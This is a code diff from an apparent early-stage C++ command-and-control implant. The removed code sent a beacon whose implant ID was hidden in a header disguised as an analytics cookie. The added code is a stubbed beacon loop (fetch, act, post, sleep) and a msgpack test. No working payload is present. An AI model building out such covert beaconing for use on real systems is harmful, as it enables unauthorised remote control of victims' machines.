@@ -1,36 +1,53 @@
 ﻿// Implant_v01.cpp : Defines the entry point for the application.
 //
+#include <iostream>
 
 #include "Implant_v01.h"
+#include "lifecycle/register.h"
+
+int temp_loop() {
+    while (1) {
+        //HTTP_GET
+
+        //ACTIONS
+
+        //HTTP_POST
+
+        //SLEEP
+        return 0;
+
+    }
+}
+
 #include <iostream>
-#include "protocols/http_wininet/http.h"
-
+#include <iterator>
+#include <utility>
 #include <vector>
+#include <map>
+#include "protocols/msgpack/msgpack23.h"
 
+int test_pack() {
+    std::map<std::string, int> const original{ {"apple", 1}, {"banana", 2} };
 
-//placeholder
-int register_implant() {
-    std::vector<char> responseBuffer;
+    std::vector<unsigned char> data{};
+    msgpack23::Packer packer{ std::back_inserter(data) };
+    packer(original);
 
-    // Define headers (No \r\n needed)
-    std::vector<std::wstring> headers = {
-        //msgpack -> b64: {"implant_uuid":"00000-00...."}
-        L"utmcc: gaxpbXBsYW50X3V1aWTZIzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAw"
-    };
+    std::map<std::string, int> unpacked;
+    msgpack23::Unpacker unpacker{ data };
+    unpacker(unpacked);
 
-    if (HTTP_GET(headers, responseBuffer)) {
-        std::cout << "Success! Bytes read: " << responseBuffer.size() << std::endl;
+    for (auto const& [key, value] : unpacked) {
+        std::cout << key << ": " << value << '\n';
     }
-    else {
-        std::cerr << "Request failed." << std::endl;
-    }
-
-    return 0;
 }
 
 int main()
 {
     std::cout << "hello" << std::endl;
-    register_implant();
+    //register_implant();
+    test_pack();
+    //loop
+
     return 0;
 }
